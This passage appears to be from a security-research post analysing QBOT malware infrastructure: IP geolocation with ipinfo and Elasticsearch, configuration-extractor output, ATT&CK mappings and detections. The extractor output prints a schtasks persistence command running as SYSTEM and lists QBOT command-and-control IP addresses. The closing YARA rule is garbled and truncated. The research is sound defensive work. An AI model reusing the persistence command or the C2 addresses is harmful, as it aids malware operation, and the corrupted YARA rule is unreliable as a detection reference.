attachments.\n\n![Samples by file type](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt4fbda1effe74e721/6a7c8231227b1cef7f5926ac/sample_file_types.jpg \"Samples by file type\")\n\nFurthermore, looking at the samples over time, we can see a change in how the network infrastructure was being used. On November 4, 2020, we see a change from predominantly EMOTET and generic samples to the first QBOT sample in our dataset on November 28, 2020. From there, Win32DLL files make up 97.1% of samples first observed after November 2020.\n\n![Collected samples over time](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltc3aa55059e037d6f/6a7c8234bdcff04544c3d0a8/all_samples_over_time.jpg \"Collected samples over time\")\n\n### Analyzing Network Events\n\nWhen looking at the large number of IP addresses collected from both static and dynamic analysis, we wanted to put them into a data analysis platform so that we could visualize them geographically and identify the network owners.\n\nTo do this, we used the ipinfo.io CLI tool. You can [get an API key](https://ipinfo.io/signup) and download the [tool for free](https://github.com/ipinfo/cli).\n\nTo start, we collected our list of 138 IP addresses and then sent them through the ipinfo CLI tool as a bulk job, and output results as JSON into a file called **qbot.json**.\n\n```\n$ ipinfo bulk \u003e qbot.json\n** manual input mode **\nEnter all IPs, one per line:\n140.82.49.12\n144.202.2.175\n144.202.3.39\n149.28.238.199\n45.63.1.12\n45.76.167.26\n…truncated…\n{\n  \"140.82.49.12\": {\n    \"ip\": \"140.82.49.12\",\n    \"hostname\": \"140.82.49.12.vultrusercontent.com\",\n    \"city\": \"San Jose\",\n    \"region\": \"California\",\n    \"country\": \"US\",\n    \"country_name\": \"United States\",\n    \"loc\": \"37.3394,-121.8950\",\n    \"org\": \"AS20473 The Constant Company, LLC\",\n    \"postal\": \"95103\",\n    \"timezone\": \"America/Los_Angeles\"\n  },\n  \"144.202.2.175\": {\n    \"ip\": \"144.202.2.175\",\n    \"hostname\": \"144.202.2.175.vultrusercontent.com\",\n    \"city\": \"New York City\",\n    \"region\": \"New York\",\n    \"country\": \"US\",\n    \"country_name\": \"United States\",\n    \"loc\": \"40.7143,-74.0060\",\n    \"org\": \"AS20473 The Constant Company, LLC\",\n    \"postal\": \"10004\",\n    \"timezone\": \"America/New_York\"\n  },\n…truncated…\n```\n\nNext, we need to change this into to a newline-delimited JSON (NDJSON) file so that we can quickly upload it into Elasticsearch for analysis. To do this, we can use the tool [Jquery](https://stedolan.github.io/jq/), a command-line JSON processor.\n\n```\n$ cat qbot.json | jq -c '.[]' \u003e qbot.ndjson\n\n{\"ip\":\"140.82.49.12\",\"hostname\":\"140.82.49.12.vultrusercontent.com\",\"city\":\"San Jose\",\"region\":\"California\",\"country\":\"US\",\"country_name\":\"United States\",\"loc\":\"37.3394,-121.8950\",\"org\":\"AS20473 The Constant Company, LLC\",\"postal\":\"95103\",\"timezone\":\"America/Los_Angeles\"}\n{\"ip\":\"144.202.2.175\",\"hostname\":\"144.202.2.175.vultrusercontent.com\",\"city\":\"New York City\",\"region\":\"New York\",\"country\":\"US\",\"country_name\":\"United States\",\"loc\":\"40.7143,-74.0060\",\"org\":\"AS20473 The Constant Company, LLC\",\"postal\":\"10004\",\"timezone\":\"America/New_York\"}\n…truncated…\n```\n\nNow that we have an NDJSON file, we can upload that into Elasticsearch through Kibana (or with Filebeat or the Elastic Agent). To do this, we’ll use the [Elastic Container Project](https://github.com/peasead/elastic-container) to spin up an entire Elastic Stack in Docker to do our analysis.\n\nOnce the containers have spun up, navigate to the Data Visualizer from within the Machine Learning menu. Select the NDJSON file that you created previously, and click the blue Import button.\n\nProvide an index name and then click on the Advanced tab. Under the Mappings settings, change **loc** to **geo_point** and then click the blue Import button.\n\n![Set \"loc\" to \"geo_point\"](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltabca94c1b6009355/6a7c82373ce8e2239dcef70d/data_visualizer_geo_point.jpg \"Set \\\"loc\\\" to \\\"geo_point\\\"\")\n\nNow that we have the data loaded into Elasticsearch, you can do additional analysis, such as creating a [map visualization](https://www.elastic.co/guide/en/kibana/current/maps.html).\n\nWhen looking at the distribution of network entities, we see them spread across the globe with most of them belonging to a variety of Internet service providers.\n\n![Map of all identified network infrastructure](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt6f9909bb0629e8f8/6a7c823a4c4bfb4045cc78cc/network_all_ips.jpg \"Map of all identified network infrastructure\")\n\nA caveat to the ISP-owned addresses, we did observe 7 IP addresses owned by Vultr. Vultr is a legitimate cloud hosting provider and is also a favorite among adversaries because of the ability to upload custom ISO files that allow for a protected command \u0026 control server.\n\n![Network infrastructure node information](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt6a8ea8d9b4bdd67b/6a7c823ce02fac4ad05d04ef/network_vultr.jpg \"Network infrastructure node information\")\n\n## QBOT Configuration Extractor\n\nCollecting elements of malware events is a valuable analysis skill that can assist in the identification of additional compromised hosts in a contested environment.\n\nElastic Security Labs has released an open source tool, under the Apache 2.0 license, that will allow for configurations to be extracted from QBOT samples. The tool can be downloaded [here](https://www.elastic.co/security-labs/qbot-configuration-extractor).\n\n```\n$ qbot-config-extractor -f c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a\n\n=== Strings ===\n# Blob address: 0x100840a0\n# Key address: 0x10084040\n[0x0]: ProgramData\n[0xc]: /t4\n[0x10]: EBBA\n[0x15]: netstat -nao\n[0x22]: jHxastDcds)oMc=jvh7wdUhxcsdt2\n[0x40]: schtasks.exe /Create /RU \"NT AUTHORITY\\SYSTEM\" /SC ONSTART /TN %u /TR \"%s\" /NP /F\n\n...truncated...\n\n=== RESOURCE 1 ===\nKey: b'\\\\System32\\\\WindowsPowerShel1\\\\v1.0\\\\powershel1.exe'\nType: DataType.DOMAINS\n41.228.22.180:443\n47.23.89.62:995\n176.67.56.94:443\n103.107.113.120:443\n148.64.96.100:443\n47.180.172.159:443\n181.118.183.98:443\n\n...truncated...\n```\n\nWe have asked Vultr to review our QBOT research and take appropriate actions in accordance with their customer Use Policy, but have not received a response as of publication.\n\n## Observed Adversary Tactics and Techniques\n\n### Tactics\n\nUsing the MITRE ATT\u0026CK® framework, tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.\n\n- [Execution](https://attack.mitre.org/tactics/TA0002)\n- [Persistence](https://attack.mitre.org/tactics/TA0003)\n- [Privilege Escalation](https://attack.mitre.org/tactics/TA0004)\n- [Defense Evasion](https://attack.mitre.org/tactics/TA0005)\n- [Command and Control](https://attack.mitre.org/tactics/TA0011)\n\n### Techniques / Sub Techniques\n\nTechniques and Sub techniques represent how an adversary achieves a tactical goal by performing an action.\n\n- [Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)\n- [Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005)\n- [Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)\n- [Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001)\n- [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)\n- [Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001)\n- [Indicator Removal on Host: File Deletion](https://attack.mitre.org/techniques/T1070/004)\n\n## Detections\n\nThe following detection rules and behavior prevention events were observed throughout the analysis of the QBOT sample.\n\n- [Suspicious Execution via Scheduled Task](https://www.elastic.co/guide/en/security/current/suspicious-execution-via-scheduled-task.html)\n- [Startup or Run Key Registry Modification](https://www.elastic.co/guide/en/security/current/startup-or-run-key-registry-modification.html)\n- Memory Threat Detection Alert: Shellcode Injection\n- Malicious Behavior Detection Alert: Suspicious String Value Written to Registry Run Key\n- Malicious Behavior Detection Alert: Suspicious Scheduled Task Creation\n\n### YARA\n\nElastic Security has created YARA rules to identify this activity.\n\n```\nrule Windows_Trojan_Qbot_1 {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2021-02-16\"\n        last_modified = \"2021-08-23\"\n        os = F7 75 F4 8B 45 08 8A 04 02 32 04 ?? 88 04 ?? ?? 83 ?? 01 }\n        $set_key = { 8D 87 00 04 00 00 50 56 E8 ?? ?? ?? ?? 59 8B D0 8B CE E8 }\n        $do_computer_use_russian_like_keyboard = { B9 FF 03 00 00 66 23 C1 33 C9 0F B7 F8 66 3B 7C 4D }\n        $execute_each_tasks = { 8B 44 0E ?? 85 C0 74 ?? FF D0 EB ?? 6A 00 6A 00 6A 00 FF 74 0E ??
